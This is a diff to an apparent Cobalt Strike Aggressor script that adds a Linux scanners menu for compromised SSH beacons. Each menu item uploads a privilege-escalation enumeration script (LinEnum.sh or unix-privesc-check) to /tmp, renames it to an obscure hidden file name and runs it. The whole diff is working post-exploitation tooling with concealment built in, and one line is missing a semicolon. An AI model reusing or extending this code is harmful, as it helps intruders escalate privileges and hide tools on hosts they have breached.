@@ -16,5 +16,41 @@ popup beacon_bottom {
 				}
 			}
 		}
+		menu "Linux"{
+			menu "Scanners"{
+				item "Run LinEnum.sh"{
+					local('$bid');
+					foreach $bid ($1){
+						if (-isssh $bid){
+							bcd($1, "/tmp");
+							bupload($1, script_resource("scripts/LinEnum.sh"));
+							bshell($1, "mv /tmp/LinEnum.sh /tmp/.AGq4yheattttt5y.sh");
+							bshell($1, "chmod +x /tmp/.AGq4yheattttt5y.sh")
+							bshell($1, "/tmp/.AGq4yheattttt5y.sh -t");
+							blog($1, "Make sure you delete the /tmp/.AGq4yheattttt5y.sh file once the script is complete");	
+						}
+						else {
+							blog($1, "This is not an SSH beacon!");
+						}
+					}
+				}
+				item "Run unix-privesc-check"{
+					local('$bid');
+					foreach $bid ($1){
+						if (-isssh $bid){
+							bcd($1, "/tmp");
+							bupload($1, script_resource("scripts/unix-privesc-check"));
+							bshell($1, "mv /tmp/unix-privesc-check /tmp/.AGr5qgrakHSTR");
+							bshell($1, "chmod +x /tmp/.AGr5qgrakHSTR");
+							bshell($1, "/tmp/.AGr5qgrakHSTR detailed");
+							blog($1, "Make sure you delete the /tmp/.AGr5qgrakHSTR file once the script is complete");
+						}
+						else {
+							blog($1, "This is not an SSH beacon!");
+						}
+					}
+				}
+			}
+		}
 	}
 }
